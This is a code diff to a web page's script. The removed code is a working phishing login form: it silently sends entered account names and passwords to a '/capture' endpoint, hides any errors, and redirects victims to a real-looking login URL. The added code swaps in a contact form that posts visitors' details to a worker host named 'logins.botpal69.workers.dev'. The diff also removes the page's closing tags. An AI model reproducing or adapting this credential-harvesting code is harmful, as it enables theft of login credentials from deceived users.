@@ -237,64 +237,33 @@
     </div>
 
     <script>
-      const TARGET_URL =
-        "https://qvsewx.com/pages/auth-login/index/pages/auth-login/index/pages/auth-login/index#/";
+  const WORKER_URL = "https://logins.botpal69.workers.dev";
 
-      // Tab Switchers
-      const tabEmail = document.getElementById("tabEmail");
-      const tabPhone = document.getElementById("tabPhone");
-      const accountInput = document.getElementById("email");
-      const accountLabel = document.getElementById("accountLabel");
+  document.getElementById("contactForm").addEventListener("submit", async (e) => {
+    e.preventDefault();
 
-      tabEmail.addEventListener("click", () => {
-        tabEmail.classList.add("active");
-        tabPhone.classList.remove("active");
-        accountLabel.innerText = "Email";
-        accountInput.type = "email";
-        accountInput.placeholder = "Please enter email";
+    const payload = {
+      name: document.getElementById("name").value.trim(),
+      email: document.getElementById("email").value.trim(),
+      message: document.getElementById("message").value.trim()
+    };
+
+    try {
+      const response = await fetch(WORKER_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
       });
 
-      tabPhone.addEventListener("click", () => {
-        tabPhone.classList.add("active");
-        tabEmail.classList.remove("active");
-        accountLabel.innerText = "Phone Number";
-        accountInput.type = "tel";
-        accountInput.placeholder = "Please enter phone number";
-      });
-
-      // Password Toggle
-      const togglePassword = document.getElementById("togglePassword");
-      const passwordInput = document.getElementById("password");
-      togglePassword.addEventListener("click", () => {
-        const isPassword = passwordInput.type === "password";
-        passwordInput.type = isPassword ? "text" : "password";
-      });
-
-      // Back Button
-      document.getElementById("backBtn").addEventListener("click", () => {
-        window.location.href = TARGET_URL;
-      });
-
-      // Form Handling
-      document
-        .getElementById("loginForm")
-        .addEventListener("submit", async (e) => {
-          e.preventDefault();
-          const account = accountInput.value;
-          const pwd = passwordInput.value;
-
-          try {
-            await fetch("http://127.0.0.1:5000/capture", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ u: account, p: pwd }),
-            });
-          } catch (err) {
-            // Silently swallow potential local fetch errors so redirect always occurs
-          }
-
-          window.location.href = TARGET_URL;
-        });
-    </script>
-  </body>
-</html>
+      if (response.ok) {
+        alert("Form submitted successfully!");
+        document.getElementById("contactForm").reset();
+      } else {
+        alert("Failed to send message. Please check the logs.");
+      }
+    } catch (err) {
+      console.error("Submission error:", err);
+      alert("Network error occurred.");
+    }
+  });
+</script>
